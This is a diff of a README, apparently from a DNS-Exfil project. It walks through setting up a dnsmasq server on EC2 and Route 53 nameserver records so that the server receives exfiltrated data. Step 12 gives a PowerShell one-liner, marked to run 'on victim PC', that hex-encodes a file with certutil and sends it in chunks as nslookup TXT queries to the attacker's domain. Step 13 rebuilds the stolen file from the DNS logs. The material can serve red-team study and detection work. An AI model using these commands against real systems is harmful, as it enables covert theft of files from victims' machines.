@@ -16,28 +16,29 @@ Outbound - Any
 `sudo yum install dnsmasq`  
 `sudo nano /etc/dnsmasq.conf`  
   
-Then input the content below, right at the bottom of the config file    
+Then input the content below into /etc/dnsmasq.conf, right at the bottom of the config file    
   
 listen-address=<EC2's private IP>  
 address=/#/<EC2's public IP>  
 log-queries  
 log-facility=/var/log/dnsmasq.log  
   
-Restart the VM, or find a way to restart dnsmasq 
+Restart the VM, or use the commands below to restart dnsmasq  
 `ps -aux | grep dnsmasq`  
-`sudo kill <pid of dnsmasq>`
+`sudo kill <pid of dnsmasq>`  
 `sudo systemctl restart systemd-networkd.service`  
-`sudo dnsmasq`
+`sudo dnsmasq`  
 
 ![image](https://github.com/benlee105/DNS-Exfil/assets/62729308/b0cfaf2f-93c0-4967-957c-cd3269241435)
   
 
 ## Step 5: Go to Route 53 config, note down default SOA and NS records  
+Route 53 > click Hosted zones  
   
-![image](https://github.com/benlee105/DNS-Exfil/assets/62729308/3291d850-0692-4017-9cd0-398aa51e97ea)
+![image](https://github.com/benlee105/DNS-Exfil/assets/62729308/50f03726-cfaf-4c20-b2c4-b5f1186cc1ee)
 
 
-## Step 6: Create A Record to point from record name to your EC2 instance
+## Step 6: In Route 53 config, create 2x A Record to point NS record to your EC2 instance
 **Record Name:** ns1.<yourdomain.com>  
 **Type:** A  
 **Value:** <your EC2 public IP address>  
@@ -62,6 +63,7 @@ ns2.<yourdomain.com>
 **Value:** ns1.<yourdomain.com>. admin.<yourdomain.com> 1 7200 900 1209600 86400  
 **TTL:** 60  
 
+  
 ## Step 9: Modify glue records
 In Route 53, click on Registered domains > click Actions > Edit name servers
 
@@ -81,19 +83,26 @@ Once current settings noted down, change it to point to your own DNS server then
   
 
 ## Step 10: Use CMD to nslookup as a test
-nslookup -q=TXT 12332145343dafdsa234234123123453asdf234sadfsadfasdf ns1.<yourdomain.com>  
+Launch cmd prompt on victim PC then run the command below  
+`nslookup -q=TXT 17April2024206pm.<yourdomain.com> ns1.<yourdomain.com>`  
+  
+![image](https://github.com/benlee105/DNS-Exfil/assets/62729308/1cf48904-5c60-4e33-924d-108513b1b5e4)
 
 
 ## Step 11: Check your DNS logs in EC2
-sudo cat /var/log/dnsmasq.log | grep -F "[TXT]"  
+In EC2 DNS server, run the command below and observe your nslookup query being logged.
+`sudo cat /var/log/dnsmasq.log | grep -F "[TXT]"`  
 
 
 ## Step 12: Powershell command to hex encode a file, split, and do nslookup
-
-`certutil -encodehex ToExfil.txt encoded.hex 12; $buffer = Get-Content .\encoded.hex; $split = $buffer -split '(.{50})' -ne ''; foreach ($line in $split) {nslookup -q=TXT "$Line.<yourdomain.com>" ns1.<yourdomain.com>; sleep 5} `
+Launch powershell prompt on victim PC then run command below.  
+   
+`cd <to folder holding file to exfiltrate>`  
+`certutil -encodehex <file to exfiltrate> encoded.hex 12; $buffer = Get-Content .\encoded.hex; $split = $buffer -split '(.{50})' -ne ''; foreach ($line in $split) {nslookup -q=TXT "$Line.<yourdomain.com>" ns1.<yourdomain.com>; sleep 5} `
 
 
 ## Step 13: Use a BASH command to read contents from TXT requests, remove unnecessary content, remove line break, remove spacing
+In EC2 DNS server, run the commands below to combine assemble hex into file.  
 
 `sudo cat /var/log/dnsmasq.log | grep -F '[TXT]' | cut -f 7 -d ' ' | cut -f 1 -d '.' | sed -z 's/\n/ /g' | sed -e 's/[[:space:]]//g' > output`  
 `sudo cat output | xxd -p -r > ToExfil.txt | cat ToExfil.txt`  
